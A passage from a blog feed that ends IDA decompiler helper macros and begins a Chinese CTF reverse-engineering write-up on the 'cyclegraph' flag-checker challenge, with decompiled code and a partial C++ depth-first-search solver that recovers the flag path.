class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span> uint64 __PAIR__(uint32 high, T low) { <span class="hljs-keyword">return</span> (((uint64)high) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(high)*<span class="hljs-number">8</span>) | <span class="hljs-built_in">uint32</span>(low); }</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// rotate left</span></span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span> T __ROL__(T value, uint count)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">const</span> uint nbits = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) * <span class="hljs-number">8</span>;</span><br><span class="line">  count %= nbits;</span><br><span class="line"></span><br><span class="line">  T high = value &gt;&gt; (nbits - count);</span><br><span class="line">  value &lt;&lt;= count;</span><br><span class="line">  value |= high;</span><br><span class="line">  <span class="hljs-keyword">return</span> value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// rotate right</span></span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span> T __ROR__(T value, uint count)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">const</span> uint nbits = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) * <span class="hljs-number">8</span>;</span><br><span class="line">  count %= nbits;</span><br><span class="line"></span><br><span class="line">  T low = value &lt;&lt; (nbits - count);</span><br><span class="line">  value &gt;&gt;= count;</span><br><span class="line">  value |= low;</span><br><span class="line">  <span class="hljs-keyword">return</span> value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// carry flag of left shift</span></span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span> int8 __MKCSHL__(T value, uint count)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">const</span> uint nbits = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) * <span class="hljs-number">8</span>;</span><br><span class="line">  count %= nbits;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> (value &gt;&gt; (nbits-count)) &amp; <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// carry flag of right shift</span></span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span> int8 __MKCSHR__(T value, uint count)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">return</span> (value &gt;&gt; (count<span class="hljs-number">-1</span>)) &amp; <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// sign flag</span></span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span> int8 __SETS__(T x)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) == <span class="hljs-number">1</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int8</span>(x) &lt; <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) == <span class="hljs-number">2</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int16</span>(x) &lt; <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) == <span class="hljs-number">4</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int32</span>(x) &lt; <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">int64</span>(x) &lt; <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// overflow flag of subtraction (x-y)</span></span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title">U</span>&gt;</span> int8 __OFSUB__(T x, U y)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) &lt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(U) )</span><br><span class="line">  {</span><br><span class="line">    U x2 = x;</span><br><span class="line">    int8 sx = __SETS__(x2);</span><br><span class="line">    <span class="hljs-keyword">return</span> (sx ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2-y));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    T y2 = y;</span><br><span class="line">    int8 sx = __SETS__(x);</span><br><span class="line">    <span class="hljs-keyword">return</span> (sx ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x-y2));</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// overflow flag of addition (x+y)</span></span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title">U</span>&gt;</span> int8 __OFADD__(T x, U y)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) &lt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(U) )</span><br><span class="line">  {</span><br><span class="line">    U x2 = x;</span><br><span class="line">    int8 sx = __SETS__(x2);</span><br><span class="line">    <span class="hljs-keyword">return</span> ((<span class="hljs-number">1</span> ^ sx) ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2+y));</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    T y2 = y;</span><br><span class="line">    int8 sx = __SETS__(x);</span><br><span class="line">    <span class="hljs-keyword">return</span> ((<span class="hljs-number">1</span> ^ sx) ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x+y2));</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// carry flag of subtraction (x-y)</span></span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title">U</span>&gt;</span> int8 __CFSUB__(T x, U y)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">int</span> size = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(U) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) : <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(U);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">1</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint8</span>(x) &lt; <span class="hljs-built_in">uint8</span>(y);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">2</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint16</span>(x) &lt; <span class="hljs-built_in">uint16</span>(y);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">4</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint32</span>(x) &lt; <span class="hljs-built_in">uint32</span>(y);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint64</span>(x) &lt; <span class="hljs-built_in">uint64</span>(y);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// carry flag of addition (x+y)</span></span><br><span class="line"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title">U</span>&gt;</span> int8 __CFADD__(T x, U y)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">int</span> size = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) &gt; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(U) ? <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(T) : <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(U);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">1</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint8</span>(x) &gt; <span class="hljs-built_in">uint8</span>(x+y);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">2</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint16</span>(x) &gt; <span class="hljs-built_in">uint16</span>(x+y);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">4</span> )</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint32</span>(x) &gt; <span class="hljs-built_in">uint32</span>(x+y);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint64</span>(x) &gt; <span class="hljs-built_in">uint64</span>(x+y);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span></span><br><span class="line"><span class="hljs-comment">// The following definition is not quite correct because it always returns</span></span><br><span class="line"><span class="hljs-comment">// uint64. The above C++ functions are good, though.</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __PAIR__(high, low) (((uint64)(high)&lt;&lt;sizeof(high)*8) | low)</span></span><br><span class="line"><span class="hljs-comment">// For C, we just provide macros, they are not quite correct.</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __ROL__(x, y) __rotl__(x, y)      <span class="hljs-comment">// Rotate left</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __ROR__(x, y) __rotr__(x, y)      <span class="hljs-comment">// Rotate right</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __CFSHL__(x, y) invalid_operation <span class="hljs-comment">// Generate carry flag for (x&lt;&lt;y)</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __CFSHR__(x, y) invalid_operation <span class="hljs-comment">// Generate carry flag for (x&gt;&gt;y)</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __CFADD__(x, y) invalid_operation <span class="hljs-comment">// Generate carry flag for (x+y)</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __CFSUB__(x, y) invalid_operation <span class="hljs-comment">// Generate carry flag for (x-y)</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __OFADD__(x, y) invalid_operation <span class="hljs-comment">// Generate overflow flag for (x+y)</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __OFSUB__(x, y) invalid_operation <span class="hljs-comment">// Generate overflow flag for (x-y)</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// No definition for rcl/rcr because the carry flag is unknown</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __RCL__(x, y)    invalid_operation <span class="hljs-comment">// Rotate left thru carry</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __RCR__(x, y)    invalid_operation <span class="hljs-comment">// Rotate right thru carry</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __MKCRCL__(x, y) invalid_operation <span class="hljs-comment">// Generate carry flag for a RCL</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __MKCRCR__(x, y) invalid_operation <span class="hljs-comment">// Generate carry flag for a RCR</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __SETP__(x, y)   invalid_operation <span class="hljs-comment">// Generate parity flag for (x-y)</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// In the decompilation listing there are some objects declarared as _UNKNOWN</span></span><br><span class="line"><span class="hljs-comment">// because we could not determine their types. Since the C compiler does not</span></span><br><span class="line"><span class="hljs-comment">// accept void item declarations, we replace them by anything of our choice,</span></span><br><span class="line"><span class="hljs-comment">// for example a char:</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _UNKNOWN char</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _MSC_VER</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> snprintf _snprintf</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> vsnprintf _vsnprintf</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> IDA </tag>
            
            <tag> 查表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高校战疫-两道re-wp</title>
      <link href="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-%E4%B8%A4%E9%81%93re-wp/"/>
      <url>/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-%E4%B8%A4%E9%81%93re-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这两天攻防世界有个比赛，上面的题目还不错，参与了一下，至于为什么是两道re，因为正好赶上数模美赛，没怎么有时间做（实际上就是因为菜</p><span id="more"></span><h4 id="cyclegraph"><a href="#cyclegraph" class="headerlink" title="cyclegraph"></a>cyclegraph</h4><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_00401080</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> cVar1;</span><br><span class="line">  <span class="hljs-keyword">char</span> *pcVar2;</span><br><span class="line">  undefined4 *puVar3;</span><br><span class="line">  undefined1 unaff_DI;</span><br><span class="line">  <span class="hljs-keyword">int</span> iVar4;</span><br><span class="line">  <span class="hljs-keyword">char</span> local_20 [<span class="hljs-number">4</span>];</span><br><span class="line">  <span class="hljs-keyword">char</span> local_1c;</span><br><span class="line">  <span class="hljs-keyword">char</span> acStack27 [<span class="hljs-number">16</span>];</span><br><span class="line">  <span class="hljs-keyword">char</span> local_b;</span><br><span class="line">  uint local_8;</span><br><span class="line">  </span><br><span class="line">  local_8 = DAT_00403004 ^ (uint)&amp;stack0xfffffffc;</span><br><span class="line">  DAT_00403370 = <span class="hljs-number">0</span>;</span><br><span class="line">  puVar3 = &amp;DAT_00403384;</span><br><span class="line">  DAT_00403374 = <span class="hljs-string">'0'</span>;</span><br><span class="line">  DAT_00403378 = &amp;DAT_00403380;</span><br><span class="line">  iVar4 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">do</span> {</span><br><span class="line">    puVar3[<span class="hljs-number">-1</span>] = *(undefined4 *)((<span class="hljs-keyword">int</span>)null_ARRAY_00402178 + iVar4);</span><br><span class="line">    *(undefined4 **)puVar3 = &amp;DAT_00403380 + *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">int</span>)null_ARRAY_00402278 + iVar4) * <span class="hljs-number">3</span>;</span><br><span class="line">    *(undefined4 **)(puVar3 + <span class="hljs-number">1</span>) = &amp;DAT_00403380 + *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">int</span>)null_ARRAY_004021f8 + iVar4) * <span class="hljs-number">3</span>;</span><br><span class="line">    puVar3 = puVar3 + <span class="hljs-number">3</span>;</span><br><span class="line">    iVar4 = iVar4 + <span class="hljs-number">4</span>;</span><br><span class="line">  } <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">int</span>)puVar3 &lt; <span class="hljs-number">0x403504</span>);</span><br><span class="line">  <span class="hljs-built_in">print</span>(<span class="hljs-string">"You need a flag to get out of this:\n"</span>,unaff_DI);</span><br><span class="line">  <span class="hljs-built_in">scan</span>(&amp;DAT_0040214c,<span class="hljs-number">0xe0</span>);</span><br><span class="line">  iVar4 = <span class="hljs-number">5</span>;</span><br><span class="line">  <span class="hljs-keyword">do</span> {</span><br><span class="line">    cVar1 = local_20[iVar4];</span><br><span class="line">    <span class="hljs-keyword">if</span> (*DAT_00403378 + (<span class="hljs-keyword">int</span>)DAT_00403374 == (<span class="hljs-keyword">int</span>)cVar1) {</span><br><span class="line">      DAT_00403378 = (<span class="hljs-keyword">int</span> *)DAT_00403378[<span class="hljs-number">1</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> {</span><br><span class="line">      <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">int</span>)DAT_00403374 - *DAT_00403378 != (<span class="hljs-keyword">int</span>)cVar1) {</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">"This is not flag~\n"</span>,unaff_DI);</span><br><span class="line">        <span class="hljs-built_in">system</span>(<span class="hljs-string">"pause"</span>);</span><br><span class="line">                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">      }</span><br><span class="line">      DAT_00403378 = (<span class="hljs-keyword">int</span> *)DAT_00403378[<span class="hljs-number">2</span>];</span><br><span class="line">    }</span><br><span class="line">    DAT_00403374 = local_20[iVar4];</span><br><span class="line">    DAT_00403370 = DAT_00403370 + <span class="hljs-number">1</span>;</span><br><span class="line">    iVar4 = iVar4 + <span class="hljs-number">1</span>;</span><br><span class="line">  } <span class="hljs-keyword">while</span> (iVar4 &lt; <span class="hljs-number">0x15</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> (((((local_20[<span class="hljs-number">0</span>] == <span class="hljs-string">'f'</span>) &amp;&amp; (local_20[<span class="hljs-number">1</span>] == <span class="hljs-string">'l'</span>)) &amp;&amp; (local_20[<span class="hljs-number">2</span>] == <span class="hljs-string">'a'</span>)) &amp;&amp;</span><br><span class="line">      ((local_20[<span class="hljs-number">3</span>] == <span class="hljs-string">'g'</span> &amp;&amp; (local_1c == <span class="hljs-string">'{'</span>)))) &amp;&amp; (local_b == <span class="hljs-string">'}'</span>)) {</span><br><span class="line">    <span class="hljs-keyword">if</span> ((DAT_00403370 &lt; <span class="hljs-number">0x11</span>) &amp;&amp; (DAT_00403378 == (<span class="hljs-keyword">int</span> *)&amp;DAT_004034f4)) {</span><br><span class="line">      pcVar2 = <span class="hljs-string">"Congratulations!!\n"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> {</span><br><span class="line">      pcVar2 = <span class="hljs-string">"This is not flag~\n"</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span> {</span><br><span class="line">    pcVar2 = <span class="hljs-string">"illegal input~\n"</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">print</span>(pcVar2,cVar1);</span><br><span class="line">  <span class="hljs-built_in">system</span>(<span class="hljs-string">"pause"</span>);</span><br><span class="line">  <span class="hljs-built_in">FUN_004011f4</span>();</span><br><span class="line">  <span class="hljs-keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>表面上看起来很复杂，仔细研究就会发现，开始的循环是在构造一个有向图，用到了一个结构体，而后面的部分是一个寻路的过程，正向的过程是根据输入的flag的值进行移动，最终走到最后一个位置，所以逆向的过程就是先寻找路径，然后通过找到的路径来计算flag的值</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a</span> {</span></span><br><span class="line">    <span class="hljs-keyword">int</span> val;</span><br><span class="line">    a *loc1;</span><br><span class="line">    a *loc2;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">dfs</span><span class="hljs-params">(a *ss, a *ee, <span class="hljs-keyword">int</span> n, a *s[])</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) {</span><br><span class="line">        <span class="hljs-keyword">return</span> ss == ee;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">dfs</span>(ss-&gt;loc1, ee, n - <span class="hljs-number">1</span>, s)) {</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x11</span>; i++) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-literal">nullptr</span>) {</span><br><span class="line">                s[i] = ss-&gt;loc1;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">dfs</span>(ss-&gt;loc2, ee, n - <span class="hljs-number">1</span>, s)) {</span><br><span class="line">            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x11</span>; i++) {</span><br><span class="line">                <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-literal">nullptr</span>) {</span><br><span class="line">                    s[i] = ss-&gt;loc2;</span><br><span class="line">                    <span class="hljs-keyword">break</span>;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fun</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> dword_402178[] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">52</span>, <span class="hljs-number">2</span>, <span class="hljs-number">44</span>, <span class="hljs-number">42</span>, <span class="hljs-number">6</span>, <span class="hljs-number">42</span>, <span class="hljs-number">47</span>, <span class="hljs-number">42</span>, <span class="hljs-number">51</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>, <span class="hljs-number">48</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">50</span>, <span class="hljs-number">43</span>, <span class="hljs-number">2</span>, <span class="hljs-number">46</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">45</span>, <span class="hljs-number">50</span>, <span class="hljs-number">4</span>, <span class="hljs-number">45</span>,</span><br><span class="line">                    <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">47</span>, <span class="hljs-number">51</span>, <span class="hljs-number">5</span></span><br><span class="line">            };</span><br><span class="line">    <span class="hljs-keyword">int</span> dword_4021F8[] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">23</span>, <span class="hljs-number">9</span>, <span class="hljs-number">19</span>, <span class="hljs-number">31</span>, <span class="hljs-number">23</span>, <span class="hljs-number">9</span>, <span class="hljs-number">13</span>, <span class="hljs-number">12</span>, <span class="hljs-number">29</span>, <span class="hljs-number">10</span>, <span class="hljs-number">24</span>, <span class="hljs-number">9</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">9</span>, <span class="hljs-number">26</span>, <span class="hljs-number">3</span>, <span class="hljs-number">22</span>, <span class="hljs-number">6</span>, <span class="hljs-number">17</span>, <span class="hljs-number">13</span>, <span class="hljs-number">7</span>, <span class="hljs-number">15</span>, <span class="hljs-number">20</span>, <span class="hljs-number">1</span>,</span><br><span class="line">                    <span class="hljs-number">16</span>, <span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">31</span></span><br><span class="line">            };</span><br><span class="line">    <span class="hljs-keyword">int</span> dword_402278[] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">18</span>, 